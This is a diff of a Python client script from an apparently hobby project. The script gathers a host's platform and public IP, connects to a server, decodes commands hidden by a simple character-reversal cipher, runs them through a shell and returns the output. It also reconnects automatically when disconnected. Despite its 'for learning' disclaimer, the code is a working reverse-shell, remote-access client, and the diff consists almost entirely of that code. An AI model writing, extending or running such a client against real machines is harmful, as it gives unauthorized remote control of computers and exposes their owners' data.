@@ -5,6 +5,7 @@
     File name: client.py
     Author: MathIsSimple
     Python Version: 3.7.0
+    Type: Build
     Disclaimer: I created this project to learn about custom encoding and python sockets,
                 this projected isn't made to be used for maliscious intent. Do so at your own risk
 '''
@@ -17,51 +18,75 @@ import socket
 import requests
 import platform as plat
 
-sys.path.insert(0, './../lib/')
-
-# Import needed custom python modules
-
-from hasing   import encrypt, decrypt
-from terminal import decodeCommandOutput
-from terminal import getCommandOutput
+from subprocess import Popen
+from subprocess import PIPE
 
 # Global Variables
 
-Connected = False
+characters   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'\?!&+*|`^@[]=#~-_<>(){}§\"$%µ£¤ç "
+Connected    = False
 GatheredInfo = False
 sock = None
 PORT = 64500
 Info = None
 
-# All of the functions needed for this project to work
+# Encryption Files
 
-def createSocket(HOST, PORT):
-    global Connected
+def modify(message):
+    output = ""
+    for l in message:
+        index  = characters.find(l)
+        index2 = len(characters) - 1 - index
+        letter = characters[index2]
+        output = output + letter
+    return output
 
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((HOST, PORT))
-        Connected = True
-    except ConnectionRefusedError:
-        # If we've failed to connect or the reconnect to a server, then wait 5s before trying again
+def encrypt(message):
+    output = modify(message)
+    output = output[::-1]
+    return output
+def decrypt(message):
+    output = message[::-1]
+    output = modify(output)
+    return output
 
-        print("Error While Trying To Reconnect")
-        print("Waiting 5s")
-        time.sleep(5)
+# Command Line Functions
 
-    return sock
+def decodeCommandOutput(output):
+    output = output.replace("\\", "/").replace("//", "/")
+    output = output.replace("b'", "").replace('b"', "")
+    output = output.replace("/r", "").replace("/n", "")
+    output = output.replace("/x82", "é").replace("/x8a", "è")
+    output = output.replace("/xff", " ")
+    return output
+
+def getCommandOutput(data):
+    out = []
+    process = Popen(data, stdout=PIPE, stderr=None, shell=True)
+
+    while True:
+        line = process.stdout.readline()
+        if line != b"":
+            contents = decodeCommandOutput(str(line))
+            if contents.endswith("'") or contents.endswith('"'):
+                contents = contents[:-1]
+            
+            if contents != "":
+                if contents[0] == " ":
+                    contents = contents[1:]
+            
+            out.append(contents)
+        else:
+            break
+
+    out.append("END")
+
+    return out
+
+# Information Gathering Functions
 
 def getInfo():
     global GatheredInfo
-
-    platform = plat.platform()
-    system   = plat.system()
-
-    # Get the api from ipify.org
-
-    ip = requests.get("https://api.ipify.org/?format=json").json()["ip"]    
-
-    # Get information about the info with api.ipstack.com
 
     platform  = "Platform : "  + plat.platform()
     system    = "System : "    + plat.system()
@@ -75,6 +100,22 @@ def getInfo():
 
     return   [platform, system, ip, continent, country, city, "END"]
 
+# Socket Functions
+
+def createSocket(HOST, PORT):
+    global Connected
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((HOST, PORT))
+        Connected = True
+    except ConnectionRefusedError:
+        print("Error While Trying To Reconnect")
+        print("Waiting 5s")
+        time.sleep(5)
+
+    return sock
+
 def receiveData():
     global Connected
 
@@ -83,8 +124,6 @@ def receiveData():
             data = decrypt(sock.recv(1024).decode("utf-8", 'ignore'))
             return data
         except ConnectionResetError:
-            # If we've lost connexion, then set connnected to false
-
             print("Disconnected")
             Connected = False
     
@@ -120,7 +159,7 @@ def handleCommands():
 
         if Connected == False:
             break
-
+        
         if data:
             if data != "END":
                 print("Command : " + data)
@@ -138,14 +177,10 @@ def start():
     global PORT
     global Info
 
-    # If we have already gathered info about the computer, then don't fetch it again
-
     if GatheredInfo == False:
         Info = getInfo()
         print("Gathered Info")
-
-    # Create the socket to talk with the server
-
+    
     sock = createSocket("127.0.0.1", PORT)
 
     if Connected:
@@ -154,17 +189,10 @@ def start():
         print("Sent Info")
         print("Handling Commands")
         handleCommands()
-
-    # Attempt to reconnect when the connection was lost
-
+    
     while Connected == False:
         sock = None
         print("Attempting reconnect")
-
-        # Try to start the programm over in hope that the server is back up
-
         start()
-
-# Starting the program
 
 start()
